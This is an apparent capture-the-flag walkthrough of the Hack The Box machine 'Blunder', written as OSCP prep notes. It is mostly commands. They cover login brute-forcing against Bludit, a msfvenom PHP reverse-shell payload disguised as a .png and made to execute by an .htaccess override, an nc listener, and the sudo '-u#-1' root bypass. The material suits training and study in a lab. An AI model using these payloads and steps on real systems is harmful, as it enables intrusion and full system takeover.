# 🧠 HTB: Blunder — Walkthrough

**OS:** [Linux](Linux.md)
**Difficulty:**  [HTB Easy](HTB Easy)  
**Focus:** Bludit RCE, Web enumeration, LXD priv esc  
**Tags:** OSCP Prep, TJNull List

---

## 📡 Recon

### Rustscan

```bash
rustscan -a 10.129.190.208 --ulimit 5000 -- -A
```

### /etc/hosts

```bash
echo "10.129.190.208 blunder.htb" | sudo tee -a /etc/hosts
```

### Directory Fuzzing

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://blunder.htb/FUZZ
```

---

## 🌐 [Web Enumeration](HTTP)

- Found `/admin` login panel.
- Bludit version found in HTML source: `3.9.2`

---

## 🔍 Credential Brute-force

### Attempt #1 - Default user

```bash
python3 exploit.py -l http://10.10.10.191/admin/login -u admin -p /usr/share/wordlists/rockyou.txt
```

### Discovering `fergus` from `todo.txt`

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.191/FUZZ -e .php,.txt,.html -t 64
```

#### Then retry with `fergus`:

```bash
python3 exploit.py -l http://10.10.10.191/admin/login -u fergus -p /usr/share/wordlists/rockyou.txt
```

### Custom Wordlist with `cewl`

```bash
cewl -w output.txt http://10.10.10.191
python3 exploit.py -l http://10.10.10.191/admin/login -u fergus -p ./output.txt
```

✅ **Password found:** `RolandDeschain`

---

## 💥 Authenticated RCE Exploit

### Payload Creation

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.3 LPORT=1234 -f raw -b '"' > evil.png
echo -e "<?php $(cat evil.png)" > evil.png
```

### .htaccess File

```bash
echo "RewriteEngine off" > .htaccess
echo "AddType application/x-httpd-php .png" >> .htaccess
```

> Upload both files via Burp Suite and adjust paths to write to `../../tmp/temp`.

### Trigger Payload

```bash
nc -lvnp 1234
curl http://10.10.10.191/bl-content/tmp/temp/evil.png
```

---

## 🐚 Shell as www-data ➝ Enumerate

### Decompressing `config`

```bash
mv config config.gz
gzip -d config.gz
tar -xvf config
```

---

## 👤 Shell as Hugo

### Grep for Credentials

```bash
grep -ir hugo /var/www
```

Found SHA1 hash → Cracked with CrackStation: `Password120`

```bash
su hugo
```

✅ **User Flag:** `/home/hugo/user.txt`

---

## 🧑‍🔧 Privilege Escalation

### Sudo Permissions

```bash
sudo -l
```

Allowed to run `/bin/bash` as any user except root.

```bash
sudo -u shaun /bin/bash
```

### LXD Check

```bash
id
```

If in `lxd` group, proceed with:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
lxc image import ./alpine-*.tar.gz --alias myimage
```

*(Didn’t work due to missing command... fallback below)*

---

### Sudo Vulnerability Exploit (version < 1.8.28)

```bash
sudo -V
sudo -u#-1 /bin/bash
```

✅ **Root Flag:** `/root/root.txt`
